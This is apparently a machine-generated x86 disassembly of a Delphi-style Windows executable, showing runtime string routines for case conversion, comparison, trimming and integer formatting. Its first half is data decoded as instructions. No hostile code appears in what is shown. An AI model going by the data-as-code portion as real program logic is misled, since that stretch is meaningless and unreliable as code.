add [ eax ] al
add [ esp + esi * 2 + 0x40 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] al
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebp
inc ebp
js r-xdata
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x12004031 ] al
shl [ eax + 0x73 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x75
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
je r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0xc004031 ] al
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x40 ] dh
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ebx ] cl
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax [ eax ]
loopne r-xdata
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
outsd
jb r-xdata
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esi [ eax + eax * 2 ]
adc [ eax ] al
add [ eax ] al
and [ eax + eax * 2 ] dh
fdiv [ ebx ]
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b4e4
insb
outsd
ja r-xdata
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
inc esp
imul esi [ esi + 0x69 ] 0x75746564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 2 + 0x100040 ] bl
add [ eax ] al
and [ eax + eax * 2 ] dh
fdiv [ ebx ]
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b53c
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax * 2 + 0x4f746e49 ] cl
les esi [ eax + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
inc eax
add [ esp + esi * 2 + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ecx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40751c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] dl
add [ eax ] al
add ah dh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x76
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jbe r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax * 2 + 0x61766e49 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004076 ] al
add [ eax ] al
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b6a0
xor eax [ eax ]
loopne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] ah
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
ja r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ ecx + esi + 0x40 ] al
add [ eax + 0xd004031 ] al
inc ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ esi + 0x40 ] 0x0
or al 0x0
add [ eax ] al
insb
outsd
ja r-xdata
inc ebp
pop edx
jb r-xdata
inc eax
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0xb004031 ] al
ror ah 0x75
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] al
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
outsb
lea eax [ eax ]
cwde
ja r-xdata
jb r-xdata
inc ebp
dec edi
jbe r-xdata
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x9004031 ] al
and al 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
ja r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004077 ] bl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
inc ebp
push eax
jb r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0xa004031 ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] al
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
ja r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0xc0040 ] ah
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ ecx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ esi ] cl
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edx + esi * 2 ] al
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
js r-xdata
insb
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] al
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
add [ eax ] dl
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0xc004031 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
sar [ eax ] 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
outsd
insb
inc ebx
mov eax eax
movsb [ edi ] [ esi ]
js r-xdata
arpl [ ebx + 0x4f ] bp
jbe r-xdata
jb r-xdata
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add ah bl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x79 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ ecx + esi + 0x40 ] al
add [ eax + 0xd004031 ] al
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax + 0x79 ] ah
inc eax
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
js r-xdata
insb
outsd
ja r-xdata
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] dl
inc ebp
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] cl
dec esp
js r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jns r-xdata
outsd
jb r-xdata
inc ebp
inc ebx
outsd
outsb
je r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0x9004031 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
jpe r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc004079
add [ eax ] al
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40b9dc
xor eax [ eax ]
loopne r-xdata
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
pushad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0xc0040 ] bh
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
rol [ eax ] 0x79
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec40ba38
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ ecx + esi + 0x40 ] al
add [ eax + 0xe004031 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a ] dh
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
add [ eax ] cl
push ebx
jns r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ebp
jb r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
xchg esp eax
adc [ eax ] al
outsd
jb r-xdata
int3
push ebp
add [ eax ] al
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
xor [ ecx ] 0x40
add [ esi ] cl
sbb [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
loopne r-xdata
push ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ eax + 0x7a ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
mov esp 0x4079
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d010
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
loopne r-xdata
xor eax [ eax ]
in al dx
xor eax [ eax ]
insb
jae r-xdata
loopne r-xdata
je r-xdata
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
sar bh 0xff
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr [ edx + edi * 2 + 0x3110040 ] 0x2e
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + rw-data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407b783f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 ] bh
xchg esp eax
jpo r-xdata
jb r-xdata
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add [ ecx + esi + 0x40 ] al
add al ah
int 0x40
je r-xdata
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add [ edi + ecx * 8 + 0x54240040 ] al
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
xor eax [ eax ]
in al 0x33
inc eax
add al ch
add eax 0xffffffd4
jmp sub_40d0fc
inc eax
add [ eax + eax ] al
add [ eax - 0x27ffbff0 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
out 0x3c eax
add [ eax ] al
je r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x33d80040 ] ah
inc eax
add [ eax + ebx * 2 ] cl
inc eax
add [ eax ] bl
pop eax
inc eax
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
and al 0x7b
imul ebp [ edi + 0x6e ] 0x407a8890
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + rw-data ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
call sub_40395c
pop edi
pop esi
pop ebx
retn
call sub_40b95c
push edx
popad
inc ebp
js r-xdata
mov eax eax
push ebx
lea eax [ eax ]
inc eax
add [ eax ] ch
pop eax
inc eax
add [ ecx + esi + 0x40 ] al
add [ ebx + edi * 2 ] ah
je r-xdata
insb
jne r-xdata
mov edx ebx
call sub_402ba4
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
mov eax ebx
call sub_4026dc
mov esi eax
mov eax esi
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407c28
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407c5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
pop edi
pop esi
pop ebx
retn
sub_407c80
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026dc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402ba4
mov eax esi
pop esi
pop ebx
retn
sub_407ca0
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026fc
call ebx
pop ebx
retn
sub_407ccc
push ebx
mov ebx eax
mov eax 0xc
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407ca0
pop ebx
retn
sub_407d04
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041e0
mov ebx eax
mov eax edi
mov edx ebx
call sub_40456c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407d40
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041e0
mov ebx eax
mov eax edi
mov edx ebx
call sub_40456c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407d7c
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407dac
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407dcc
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407e20
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407dcc
test eax eax
jne r-xdata
sub_407e44
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041e0
mov ebx eax
mov eax esi
call sub_4043e0
mov edx eax
mov eax edi
mov ecx ebx
call sub_404010
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407e78
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041e0
mov ebx eax
mov eax esi
call sub_4043e0
mov edx eax
mov eax edi
mov ecx ebx
call sub_404010
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407eac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041e0
push eax
mov eax esi
call sub_4043e0
push eax
mov eax ebx
call sub_4041e0
push eax
mov eax ebx
call sub_4043e0
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407ee4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041e0
push eax
mov eax esi
call sub_4043e0
push eax
mov eax ebx
call sub_4041e0
push eax
mov eax ebx
call sub_4043e0
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f34
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407f54
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4041e0
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f20
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404440
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407fa4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4041e0
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4041e0
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408008
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40801e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40801e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40801e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408054
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408008
mov edx esi
pop eax
call sub_404010
add esp 0x10
pop esi
retn
sub_408074
or cl cl
jne sub_4080a8
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4080a8
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4080a8
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4080a8
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408140
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_408074
mov edx esi
pop eax
call sub_404010
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_408168
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408008
mov edx esi
pop eax
call sub_404010
add esp 0x20
pop esi
retn
xor edx edx
sub_408190
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402bc4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
